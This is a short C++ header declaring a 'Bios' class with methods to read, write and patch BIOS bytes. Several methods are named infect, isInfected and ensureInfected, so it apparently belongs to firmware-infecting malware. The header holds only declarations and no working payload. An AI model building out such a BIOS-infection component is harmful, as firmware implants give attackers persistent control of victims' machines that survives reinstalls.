#ifndef BIOS_HPP_
#define BIOS_HPP_

#include "IBios.hpp"
#include "BiosVector.hpp"
#include "IBiosIO.hpp"
#include "patch/Patch.hpp"
#include "../logs/Log.hpp"
#include "../concurrency/IReentrantLock.hpp"
#include <vector>


class Bios : public IBios {
private:
    ILog * pLog;
    IBiosIO * pBiosIO;
    IPatch * pPatch;
    IBiosVector * pBiosBytesVector;

    IReentrantLock * pLock;
public:
    Bios();

    void setLock(IReentrantLock * pLock);
    void setLog(ILog * pLog);
    void setBiosIO(IBiosIO * pBiosIO);
    void setPatch(IPatch * pPatch);
    void setBiosBytesVector(IBiosVector * pBiosBytesVector);

    virtual void read();
    virtual bool isReaded();
    virtual void write();
    virtual bool isInfected();
    virtual void infect();
    virtual void ensureInfected();
    virtual void clear();
};

#endif /* BIOS_HPP_ */
